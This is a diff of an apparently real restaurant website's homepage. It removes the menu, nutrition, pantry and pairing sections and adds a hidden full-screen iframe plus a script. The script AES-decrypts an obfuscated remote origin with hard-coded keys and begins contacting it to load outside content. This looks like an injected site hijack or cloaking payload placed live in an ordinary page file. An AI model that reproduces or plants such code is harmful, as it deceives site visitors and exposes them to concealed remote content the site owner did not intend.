-          </p>
-          <div style="font-size: 0.84rem; color: #D97706; font-weight: 700;">Bio-Activated &bull; High Enzyme</div>
-        </div>
-      </div>
-    </div>
-  </section>
+  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
+    webkitallowfullscreen mozallowfullscreen
+    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
+    style="width:100%; height:100%; border:0;"></iframe>
+</div>
 
-  <!-- SECTION 3: SIGNATURE PULSE DEGUSTATION SHOWCASE (4 DISHES) -->
-  <section class="section" style="padding: 5rem 0; background: #F9F7F2; border-top: 1px solid #E2DCD2;">
-    <div class="container">
-      <div style="display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 3rem; flex-wrap: wrap; gap: 1.5rem;">
-        <div>
-          <span style="color: #166534; font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; display: inline-block; margin-bottom: 0.5rem;">
-            CURRENT MERCER STREET DEGUSTATION
-          </span>
-          <h2 style="font-size: 2.3rem; color: #0F1715; margin-bottom: 0.5rem;">Signature Botanical Pulse Courses</h2>
-          <p style="color: #43524D; margin-bottom: 0; font-size: 1.02rem;">Artisanal creations prepared daily in our SoHo hearth kitchen.</p>
-        </div>
-        <a href="/collection.html" class="btn btn-outline" style="border-color: #0F1715; color: #0F1715 !important;">View Full Degustation &rarr;</a>
-      </div>
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 2rem;">
-        <div style="background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-sm);">
-          <div style="height: 280px; overflow: hidden;">
-            <img src="/assets/images/botanical_seeds.jpg" alt="Volcanic Puy Lentil Carpaccio" style="width: 100%; height: 100%; object-fit: cover;">
-          </div>
-          <div style="padding: 1.8rem;">
-            <span style="font-size: 0.75rem; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.08em;">Course I &bull; Cold-Steeped</span>
-            <h3 style="font-size: 1.25rem; margin: 0.4rem 0 0.8rem; color: #0F1715;">Volcanic Puy Lentil Carpaccio</h3>
-            <p style="font-size: 0.9rem; color: #43524D; line-height: 1.6; margin-bottom: 1.2rem;">
-              Firm Le Puy green lentils tossed with pickled Chioggia beet ribbons, shaved black radish, and cold-pressed wild rapeseed emulsion.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center; padding-top: 1rem; border-top: 1px solid #F0EDE6;">
-              <span style="font-weight: 700; font-size: 1.15rem; color: #0F1715;">$38</span>
-              <a href="/contact.html" class="btn btn-sm btn-primary" style="background: #0F1715; color: #F9F7F2 !important;">Reserve Course</a>
-            </div>
-          </div>
-        </div>
-        <div style="background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-sm);">
-          <div style="height: 280px; overflow: hidden;">
-            <img src="/assets/images/blog_temper_technique.jpg" alt="Tempered Black Beluga Ragù" style="width: 100%; height: 100%; object-fit: cover;">
-          </div>
-          <div style="padding: 1.8rem;">
-            <span style="font-size: 0.75rem; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.08em;">Course II &bull; Cast-Iron Temper</span>
-            <h3 style="font-size: 1.25rem; margin: 0.4rem 0 0.8rem; color: #0F1715;">Cast-Iron Tempered Beluga Ragù</h3>
-            <p style="font-size: 0.9rem; color: #43524D; line-height: 1.6; margin-bottom: 1.2rem;">
-              Glossy Beluga pearls braised 6 hours with porcini reduction, finished with toasted coriander seed and brown butter tadka.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center; padding-top: 1rem; border-top: 1px solid #F0EDE6;">
-              <span style="font-weight: 700; font-size: 1.15rem; color: #0F1715;">$44</span>
-              <a href="/contact.html" class="btn btn-sm btn-primary" style="background: #0F1715; color: #F9F7F2 !important;">Reserve Course</a>
-            </div>
-          </div>
-        </div>
-        <div style="background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-sm);">
-          <div style="height: 280px; overflow: hidden;">
-            <img src="/assets/images/spiced_broth_terrine.jpg" alt="Whole Spiced Cast-Iron Lentil Pot" style="width: 100%; height: 100%; object-fit: cover;">
-          </div>
-          <div style="padding: 1.8rem;">
-            <span style="font-size: 0.75rem; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.08em;">Course III &bull; Clay-Pot Simmer</span>
-            <h3 style="font-size: 1.25rem; margin: 0.4rem 0 0.8rem; color: #0F1715;">Clay-Pot Simmered Golden Dal</h3>
-            <p style="font-size: 0.9rem; color: #43524D; line-height: 1.6; margin-bottom: 1.2rem;">
-              Split golden moong and red lentils simmered in unglazed earthen pots with fresh ginger root, green chilies, and black mustard temper.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center; padding-top: 1rem; border-top: 1px solid #F0EDE6;">
-              <span style="font-weight: 700; font-size: 1.15rem; color: #0F1715;">$36</span>
-              <a href="/contact.html" class="btn btn-sm btn-primary" style="background: #0F1715; color: #F9F7F2 !important;">Reserve Course</a>
-            </div>
-          </div>
-        </div>
-        <div style="background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-sm);">
-          <div style="height: 280px; overflow: hidden;">
-            <img src="/assets/images/blog_inline_tasting_plate.jpg" alt="Handcrafted Botanical Entrée" style="width: 100%; height: 100%; object-fit: cover;">
-          </div>
-          <div style="padding: 1.8rem;">
-            <span style="font-size: 0.75rem; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.08em;">Course IV &bull; Precision Pass</span>
-            <h3 style="font-size: 1.25rem; margin: 0.4rem 0 0.8rem; color: #0F1715;">The Botanical Lentil Vitrine</h3>
-            <p style="font-size: 0.9rem; color: #43524D; line-height: 1.6; margin-bottom: 1.2rem;">
-              A curated tasting trio of volcanic green, Beluga caviar, and sprout medallions with crisp flaxseed crackers and herb coulis.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center; padding-top: 1rem; border-top: 1px solid #F0EDE6;">
-              <span style="font-weight: 700; font-size: 1.15rem; color: #0F1715;">$48</span>
-              <a href="/contact.html" class="btn btn-sm btn-primary" style="background: #0F1715; color: #F9F7F2 !important;">Reserve Course</a>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY   = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1++Zv6BTjhZyPH/kuU+cCEJjI1ZAy2H2gGUPBniLQG+LGri5xJ/EKNe";
 
-  <!-- SECTION 4: NUTRITIONAL DENSITY & AGRONOMY MATRIX -->
-  <section class="section" style="padding: 5rem 0; background: #FFFFFF;">
-    <div class="container">
-      <div class="text-center" style="max-width: 760px; margin: 0 auto 3rem;">
-        <span style="color: #166534; font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; display: inline-block; margin-bottom: 0.6rem;">
-          PHYTOCHEMICAL CALIBRATION
-        </span>
-        <h2 style="font-size: 2.4rem; color: #0F1715; margin-bottom: 1rem;">Nutritional Density &amp; Terroir Benchmark Table</h2>
-        <p style="color: #43524D; font-size: 1.05rem;">
-          Verified laboratory assays of our ancestral pulse cultivars indicating protein concentration, antioxidant load, and slow-starch release.
-        </p>
-      </div>
-      <div style="overflow-x: auto; background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); box-shadow: var(--shadow-sm);">
-        <table class="spec-table" style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.92rem;">
-          <thead>
-            <tr style="background: #0F1715; color: #F9F7F2;">
-              <th style="padding: 1.2rem 1.5rem; font-weight: 600;">Pulse Cultivar</th>
-              <th style="padding: 1.2rem 1.5rem; font-weight: 600;">Terroir Sourcing</th>
-              <th style="padding: 1.2rem 1.5rem; font-weight: 600;">Protein / 100g</th>
-              <th style="padding: 1.2rem 1.5rem; font-weight: 600;">Polyphenol ORAC</th>
-              <th style="padding: 1.2rem 1.5rem; font-weight: 600;">Simmer Time</th>
-              <th style="padding: 1.2rem 1.5rem; font-weight: 600;">Glycemic Load</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr style="border-bottom: 1px solid #E2DCD2;">
-              <td style="padding: 1.1rem 1.5rem; font-weight: 700; color: #0F1715;">Volcanic Le Puy Green</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">Auvergne Basalt, France</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">26.4 Grams</td>
-              <td style="padding: 1.1rem 1.5rem; color: #166534; font-weight: 600;">7,450 &mu;mol/100g</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">35 Minutes Al-Dente</td>
-              <td style="padding: 1.1rem 1.5rem; color: #D97706; font-weight: 600;">22 (Ultra Slow-Starch)</td>
-            </tr>
-            <tr style="border-bottom: 1px solid #E2DCD2; background: #F9F7F2;">
-              <td style="padding: 1.1rem 1.5rem; font-weight: 700; color: #0F1715;">Black Beluga Pearls</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">Volcanic Plains, North America</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">25.8 Grams</td>
-              <td style="padding: 1.1rem 1.5rem; color: #166534; font-weight: 600;">8,920 &mu;mol/100g</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">45 Minutes Stewed</td>
-              <td style="padding: 1.1rem 1.5rem; color: #D97706; font-weight: 600;">24 (Sustained Energy)</td>
-            </tr>
-            <tr style="border-bottom: 1px solid #E2DCD2;">
-              <td style="padding: 1.1rem 1.5rem; font-weight: 700; color: #0F1715;">Umbrian Castelluccio Umber</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">Sibillini Plateau, Italy</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">24.2 Grams</td>
-              <td style="padding: 1.1rem 1.5rem; color: #166534; font-weight: 600;">6,800 &mu;mol/100g</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">25 Minutes Tender</td>
-              <td style="padding: 1.1rem 1.5rem; color: #D97706; font-weight: 600;">21 (Gentle Digestion)</td>
-            </tr>
-            <tr style="border-bottom: 1px solid #E2DCD2; background: #F9F7F2;">
-              <td style="padding: 1.1rem 1.5rem; font-weight: 700; color: #0F1715;">Sun-Sprouted Golden Moong</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">Rajasthan Organic Basin</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">28.1 Grams</td>
-              <td style="padding: 1.1rem 1.5rem; color: #166534; font-weight: 600;">9,150 &mu;mol/100g</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">15 Minutes Steam</td>
-              <td style="padding: 1.1rem 1.5rem; color: #D97706; font-weight: 600;">18 (Optimal Enzyme)</td>
-            </tr>
-            <tr>
-              <td style="padding: 1.1rem 1.5rem; font-weight: 700; color: #0F1715;">Anatolian Crimson Red</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">Fertile Crescent Loam</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">25.0 Grams</td>
-              <td style="padding: 1.1rem 1.5rem; color: #166534; font-weight: 600;">5,900 &mu;mol/100g</td>
-              <td style="padding: 1.1rem 1.5rem; color: #43524D;">20 Minutes Purée</td>
-              <td style="padding: 1.1rem 1.5rem; color: #D97706; font-weight: 600;">26 (Soothing Comfort)</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-      <div style="margin-top: 1.2rem; font-size: 0.85rem; color: #43524D; text-align: center;">
-        *Assayed by third-party chromatographic spectrophotometry. Sourced and prepared at 181 Mercer Street, SoHo Manhattan.
-      </div>
-    </div>
-  </section>
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN + "/data";
 
-  <!-- SECTION 5: THE BOTANICAL KITCHEN & TEMPERING LABORATORY (INTERACTIVE TABS) -->
-  <section class="section" style="padding: 5rem 0; background: #F9F7F2; border-top: 1px solid #E2DCD2;">
-    <div class="container">
-      <div class="text-center" style="max-width: 760px; margin: 0 auto 3rem;">
-        <span style="color: #166534; font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; display: inline-block; margin-bottom: 0.6rem;">
-          CULINARY SCIENCE &amp; ALCHEMY
-        </span>
-        <h2 style="font-size: 2.4rem; color: #0F1715; margin-bottom: 1rem;">The Botanical Kitchen &amp; Tempering Lab</h2>
-        <p style="color: #43524D; font-size: 1.05rem;">Select an ancestral preparation method to discover the science of flavor extraction.</p>
-      </div>
-      <div style="display: flex; justify-content: center; gap: 0.8rem; margin-bottom: 2.5rem; flex-wrap: wrap;">
-        <button onclick="switchTab('tadka')" id="tab-btn-tadka" class="btn btn-sm" style="background: #0F1715; color: #FFF; border-radius: 50px; padding: 0.6rem 1.4rem;">Whole-Seed Tempering</button>
-        <button onclick="switchTab('clay')" id="tab-btn-clay" class="btn btn-sm" style="background: #E2DCD2; color: #0F1715; border-radius: 50px; padding: 0.6rem 1.4rem;">Hand-Thrown Clay Braising</button>
-        <button onclick="switchTab('sprout')" id="tab-btn-sprout" class="btn btn-sm" style="background: #E2DCD2; color: #0F1715; border-radius: 50px; padding: 0.6rem 1.4rem;">Bio-Activated Sprouting</button>
-        <button onclick="switchTab('terroir')" id="tab-btn-terroir" class="btn btn-sm" style="background: #E2DCD2; color: #0F1715; border-radius: 50px; padding: 0.6rem 1.4rem;">Volcanic Terroir Origins</button>
-      </div>
-      <div id="tab-content" style="background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 3rem; box-shadow: var(--shadow-md);">
-        <div style="display: grid; grid-template-columns: 1.2fr 1fr; gap: 3rem; align-items: center;">
-          <div>
-            <span style="font-size: 0.8rem; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.08em;">SIGNATURE EXTRACTION TECHNIQUE</span>
-            <h3 id="tab-title" style="font-size: 1.8rem; margin: 0.5rem 0 1rem; color: #0F1715;">Whole-Seed Tempering (The Tadka Bloom)</h3>
-            <p id="tab-desc" style="color: #43524D; font-size: 1.05rem; line-height: 1.7; margin-bottom: 1.5rem;">
-              Cracking whole black mustard, cumin, and coriander seeds in cast-iron pans at precisely 175&deg;C. Within three seconds, the essential seed oils dissolve into clarified grass-fed ghee, creating a vibrant aromatic emulsion that infuses deep into braised lentils.
-            </p>
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-bottom: 1.8rem;">
-              <div style="background: #F9F7F2; padding: 1rem; border-radius: var(--radius-sm); border: 1px solid #E2DCD2;">
-                <div style="font-size: 0.75rem; color: #166534; font-weight: 700; text-transform: uppercase;">CALIBRATED TEMPERATURE</div>
-                <div id="tab-stat1" style="font-size: 1.3rem; font-weight: 700; color: #0F1715;">175&deg;C Oil Bloom</div>
-              </div>
-              <div style="background: #F9F7F2; padding: 1rem; border-radius: var(--radius-sm); border: 1px solid #E2DCD2;">
-                <div style="font-size: 0.75rem; color: #166534; font-weight: 700; text-transform: uppercase;">AROMATIC RETENTION</div>
-                <div id="tab-stat2" style="font-size: 1.3rem; font-weight: 700; color: #0F1715;">98.4% Essential Terpenes</div>
-              </div>
-            </div>
-            <a href="/about.html" class="btn btn-outline" style="border-color: #0F1715; color: #0F1715 !important;">Tour Our Hearth Kitchen &rarr;</a>
-          </div>
-          <div>
-            <img id="tab-img" src="/assets/images/blog_temper_technique.jpg" alt="Tempering technique in action" style="width: 100%; border-radius: var(--radius-md); box-shadow: var(--shadow-sm);">
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  
+  (function warmup() {
+    try {
+      const o = new URL(DATA_ORIGIN).origin;
 
-  <!-- SECTION 6: THE HEIRLOOM PULSE VITRINE (6 PANTRY & CELLAR SELECTIONS) -->
-  <section class="section" style="padding: 5rem 0; background: #FFFFFF;">
-    <div class="container">
-      <div class="text-center" style="max-width: 760px; margin: 0 auto 3.5rem;">
-        <span style="color: #166534; font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; display: inline-block; margin-bottom: 0.6rem;">
-          CELLAR PROVISIONS &amp; HARVEST ALLOCATIONS
-        </span>
-        <h2 style="font-size: 2.4rem; color: #0F1715; margin-bottom: 1rem;">The Curated Mercer Pulse Vitrine</h2>
-        <p style="color: #43524D; font-size: 1.05rem;">
-          Available for private dining reservations and limited cellar allocations at 181 Mercer Street.
-        </p>
-      </div>
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 2.5rem;">
-        <div style="border: 1px solid #E2DCD2; border-radius: var(--radius-md); overflow: hidden; background: #FFF;">
-          <img src="/assets/images/blog_oil_blooming_spice_kinetics.jpg" alt="Single-Estate Le Puy Green Jar" style="width: 100%; height: 260px; object-fit: cover;">
-          <div style="padding: 1.5rem;">
-            <span style="font-size: 0.75rem; font-weight: 700; color: #166534; text-transform: uppercase;">Auvergne Basalt Terroir</span>
-            <h3 style="font-size: 1.2rem; margin: 0.4rem 0 0.6rem; color: #0F1715;">Single-Estate Le Puy Green Jar</h3>
-            <p style="font-size: 0.88rem; color: #43524D; line-height: 1.6; margin-bottom: 1rem;">
-              Hand-harvested from certified volcanic plots in Auvergne, packaged in UV-protective earthenware crock.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="font-weight: 700; color: #0F1715; font-size: 1.1rem;">$28 / Crock</span>
-              <a href="/contact.html" class="btn btn-sm btn-primary" style="background: #0F1715; color: #FFF !important;">Reserve Batch</a>
-            </div>
-          </div>
-        </div>
-        <div style="border: 1px solid #E2DCD2; border-radius: var(--radius-md); overflow: hidden; background: #FFF;">
-          <img src="/assets/images/coconut_curry_soup_tureen.jpg" alt="Smoked Beluga Pearl Caviar" style="width: 100%; height: 260px; object-fit: cover;">
-          <div style="padding: 1.5rem;">
-            <span style="font-size: 0.75rem; font-weight: 700; color: #166534; text-transform: uppercase;">Applewood Cold-Smoked</span>
-            <h3 style="font-size: 1.2rem; margin: 0.4rem 0 0.6rem; color: #0F1715;">Smoked Black Beluga Pearls</h3>
-            <p style="font-size: 0.88rem; color: #43524D; line-height: 1.6; margin-bottom: 1rem;">
-              Black lentils slowly cold-smoked over aged applewood logs, imparting deep woody undertones.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="font-weight: 700; color: #0F1715; font-size: 1.1rem;">$32 / Tin</span>
-              <a href="/contact.html" class="btn btn-sm btn-primary" style="background: #0F1715; color: #FFF !important;">Reserve Batch</a>
-            </div>
-          </div>
-        </div>
-        <div style="border: 1px solid #E2DCD2; border-radius: var(--radius-md); overflow: hidden; background: #FFF;">
-          <img src="/assets/images/smoked_paprika_spice_bowls.jpg" alt="Stone-Ground Ancestral Dal Masala" style="width: 100%; height: 260px; object-fit: cover;">
-          <div style="padding: 1.5rem;">
-            <span style="font-size: 0.75rem; font-weight: 700; color: #166534; text-transform: uppercase;">Hand-Milled Spices</span>
-            <h3 style="font-size: 1.2rem; margin: 0.4rem 0 0.6rem; color: #0F1715;">Stone-Ground Ancestral Masala</h3>
-            <p style="font-size: 0.88rem; color: #43524D; line-height: 1.6; margin-bottom: 1rem;">
-              Wild cumin, coriander, fenugreek, and black cardamom hand-pounded on granite querns at 181 Mercer.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="font-weight: 700; color: #0F1715; font-size: 1.1rem;">$24 / Jar</span>
-              <a href="/contact.html" class="btn btn-sm btn-primary" style="background: #0F1715; color: #FFF !important;">Reserve Batch</a>
-            </div>
-          </div>
-        </div>
-        <div style="border: 1px solid #E2DCD2; border-radius: var(--radius-md); overflow: hidden; background: #FFF;">
-          <img src="/assets/images/coconut_milk_seafood_curry.jpg" alt="Cold-Infused Mustard Finishing Oil" style="width: 100%; height: 260px; object-fit: cover;">
-          <div style="padding: 1.5rem;">
-            <span style="font-size: 0.75rem; font-weight: 700; color: #166534; text-transform: uppercase;">First Cold Press</span>
-            <h3 style="font-size: 1.2rem; margin: 0.4rem 0 0.6rem; color: #0F1715;">Cold-Infused Finishing Oil</h3>
-            <p style="font-size: 0.88rem; color: #43524D; line-height: 1.6; margin-bottom: 1rem;">
-              Extra-virgin rapeseed oil infused with roasted mustard seed, whole garlic cloves, and dried red chili.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="font-weight: 700; color: #0F1715; font-size: 1.1rem;">$26 / Bottle</span>
-              <a href="/contact.html" class="btn btn-sm btn-primary" style="background: #0F1715; color: #FFF !important;">Reserve Batch</a>
-            </div>
-          </div>
-        </div>
-        <div style="border: 1px solid #E2DCD2; border-radius: var(--radius-md); overflow: hidden; background: #FFF;">
-          <img src="/assets/images/hero_ginger_dish.jpg" alt="Sprouted Moong Botanical Flour" style="width: 100%; height: 260px; object-fit: cover;">
-          <div style="padding: 1.5rem;">
-            <span style="font-size: 0.75rem; font-weight: 700; color: #166534; text-transform: uppercase;">Dehydrated Sprouted Seed</span>
-            <h3 style="font-size: 1.2rem; margin: 0.4rem 0 0.6rem; color: #0F1715;">Sprouted Moong Flour</h3>
-            <p style="font-size: 0.88rem; color: #43524D; line-height: 1.6; margin-bottom: 1rem;">
-              Low-temperature stone-milled from 48-hour sprouted golden moong pulses. Ideal for artisan crêpes.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="font-weight: 700; color: #0F1715; font-size: 1.1rem;">$22 / Pouch</span>
-              <a href="/contact.html" class="btn btn-sm btn-primary" style="background: #0F1715; color: #FFF !important;">Reserve Batch</a>
-            </div>
-          </div>
-        </div>
-        <div style="border: 1px solid #E2DCD2; border-radius: var(--radius-md); overflow: hidden; background: #FFF;">
-          <img src="/assets/images/artisan_sourdough_bread.jpg" alt="Hand-Thrown Earthen Simmer Pot" style="width: 100%; height: 260px; object-fit: cover;">
-          <div style="padding: 1.5rem;">
-            <span style="font-size: 0.75rem; font-weight: 700; color: #166534; text-transform: uppercase;">Unglazed Natural Terracotta</span>
-            <h3 style="font-size: 1.2rem; margin: 0.4rem 0 0.6rem; color: #0F1715;">Hand-Thrown Simmer Pot</h3>
-            <p style="font-size: 0.88rem; color: #43524D; line-height: 1.6; margin-bottom: 1rem;">
-              Custom ceramic pot fired at low heat with natural wood ash glaze. Balances pulse acidity organically.
-            </p>
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-              <span style="font-weight: 700; color: #0F1715; font-size: 1.1rem;">$145 / Vessel</span>
-              <a href="/contact.html" class="btn btn-sm btn-primary" style="background: #0F1715; color: #FFF !important;">Reserve Batch</a>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 7: SOMMELIER & BEVERAGE PAIRING PROTOCOL -->
-  <section class="section" style="padding: 5rem 0; background: #F9F7F2; border-top: 1px solid #E2DCD2;">
-    <div class="container">
-      <div class="text-center" style="max-width: 760px; margin: 0 auto 3.5rem;">
-        <span style="color: #166534; font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; display: inline-block; margin-bottom: 0.6rem;">
-          SOMMELIER HARMONY
-        </span>
-        <h2 style="font-size: 2.4rem; color: #0F1715; margin-bottom: 1rem;">Terroir Wine &amp; Botanical Elixir Pairings</h2>
-        <p style="color: #43524D; font-size: 1.05rem;">
-          How mineral-dense volcanic wines and wild herbal decoctions elevate earthy pulse notes.
-        </p>
-      </div>
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 2rem;">
-        <div style="background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.2rem;">
-          <span style="background: #E8EFE9; color: #166534; font-size: 0.75rem; font-weight: 700; padding: 0.25rem 0.75rem; border-radius: 4px; text-transform: uppercase;">VOLCANIC WHITES</span>
-          <h3 style="font-size: 1.3rem; margin: 1rem 0 0.8rem; color: #0F1715;">Etna Bianco Superiore</h3>
-          <p style="font-size: 0.92rem; color: #43524D; line-height: 1.65; margin-bottom: 1rem;">
-            Carricante grapes from eastern volcanic slopes cut through the earthy richness of green Puy lentils with saline minerality and crisp citrus acidity.
-          </p>
-          <div style="font-size: 0.85rem; color: #D97706; font-weight: 600;">Pairing: Volcanic Le Puy Green Carpaccio</div>
-        </div>
-        <div style="background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.2rem;">
-          <span style="background: #E8EFE9; color: #166534; font-size: 0.75rem; font-weight: 700; padding: 0.25rem 0.75rem; border-radius: 4px; text-transform: uppercase;">FOREST REDS</span>
-          <h3 style="font-size: 1.3rem; margin: 1rem 0 0.8rem; color: #0F1715;">Aged Piedmontese Nebbiolo</h3>
-          <p style="font-size: 0.92rem; color: #43524D; line-height: 1.65; margin-bottom: 1rem;">
-            Tannins softened by decade-long oak maturation meld seamlessly with slow-braised Black Beluga lentils and porcini mushroom reductions.
-          </p>
-          <div style="font-size: 0.85rem; color: #D97706; font-weight: 600;">Pairing: Cast-Iron Tempered Beluga Ragù</div>
-        </div>
-        <div style="background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.2rem;">
-          <span style="background: #E8EFE9; color: #166534; font-size: 0.75rem; font-weight: 700; padding: 0.25rem 0.75rem; border-radius: 4px; text-transform: uppercase;">BOTANICAL ELIXIRS</span>
-          <h3 style="font-size: 1.3rem; margin: 1rem 0 0.8rem; color: #0F1715;">Cold-Dripped Fennel &amp; Coriander</h3>
-          <p style="font-size: 0.92rem; color: #43524D; line-height: 1.65; margin-bottom: 1rem;">
-            Single-estate botanical seeds steeped 18 hours in cold spring water. Elicits sweet herbal freshness and aids post-degustation digestion.
-          </p>
-          <div style="font-size: 0.85rem; color: #D97706; font-weight: 600;">Pairing: Clay-Pot Simmered Golden Dal</div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 8: 181 MERCER STREET HEARTH & TASTING SALON -->
-  <section class="section" style="padding: 5.5rem 0; background: #FFFFFF;">
-    <div class="container">
-      <div style="display: grid; grid-template-columns: 1fr 1.15fr; gap: 4rem; align-items: center;">
-        <div>
-          <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-lg); border: 1px solid #E2DCD2;">
-            <img src="/assets/images/lookbook_mercer_dining.jpg" alt="181 Mercer Street Tasting Salon Table" style="width: 100%; height: auto;">
-          </div>
-        </div>
-        <div>
-          <span style="color: #166534; font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; display: inline-block; margin-bottom: 0.6rem;">
-            HEARTH EXPERIENCE &bull; SOHO MANHATTAN
-          </span>
-          <h2 style="font-size: 2.4rem; color: #0F1715; margin-bottom: 1.2rem; line-height: 1.2;">
-            The Tasting Salon at 181 Mercer Street
-          </h2>
-          <p style="font-size: 1.05rem; color: #43524D; line-height: 1.7; margin-bottom: 1.4rem;">
-            Conceived as an intimate botanical dining sanctuary in the heart of SoHo, our 181 Mercer Street lounge features a live clay-pot hearth, hand-milled spice apothecary, and private communal tasting tables for connoisseurs of fine plant gastronomy.
-          </p>
-          <div style="display: flex; flex-direction: column; gap: 0.9rem; margin-bottom: 2rem; font-size: 0.92rem; color: #323E3A;">
-            <div style="display: flex; align-items: center; gap: 0.6rem;">
-              <span style="color: #166534; font-weight: 700;">📍 Address:</span> 181 Mercer Street, New York, NY 10012, United States
-            </div>
-            <div style="display: flex; align-items: center; gap: 0.6rem;">
-              <span style="color: #166534; font-weight: 700;">📞 Phone:</span> +1-888-777-5845
-            </div>
-            <div style="display: flex; align-items: center; gap: 0.6rem;">
-              <span style="color: #166534; font-weight: 700;">✉ Concierge:</span> concierge@lentilpalate.com
-            </div>
-          </div>
-          <a href="/contact.html" class="btn btn-primary" style="background: #0F1715; color: #F9F7F2 !important;">Reserve Tasting Salon Table &rarr;</a>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 9: EXECUTIVE CULINARY DIRECTORS & BOTANISTS -->
-  <section class="section" style="padding: 5rem 0; background: #F9F7F2; border-top: 1px solid #E2DCD2;">
-    <div class="container">
-      <div class="text-center" style="max-width: 760px; margin: 0 auto 3.5rem;">
-        <span style="color: #166534; font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; display: inline-block; margin-bottom: 0.6rem;">
-          THE CULINARY COLLECTIVE
-        </span>
-        <h2 style="font-size: 2.4rem; color: #0F1715; margin-bottom: 1rem;">Master Chefs &amp; Seed Agronomists</h2>
-        <p style="color: #43524D; font-size: 1.05rem;">Leading the contemporary renaissance of ancestral pulses and botanical gastronomy.</p>
-      </div>
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2.2rem;">
-        <div style="background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.2rem; text-align: center;">
-          <div style="width: 80px; height: 80px; border-radius: 50%; background: #E8EFE9; color: #166534; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; margin: 0 auto 1.2rem; font-weight: 700;">RM</div>
-          <h3 style="font-size: 1.3rem; margin-bottom: 0.3rem; color: #0F1715;">Chef Rohan Mercer</h3>
-          <div style="font-size: 0.82rem; color: #166534; font-weight: 700; text-transform: uppercase; margin-bottom: 1rem;">Executive Culinary Director &bull; 24 Years</div>
-          <p style="font-size: 0.9rem; color: #43524D; line-height: 1.6;">
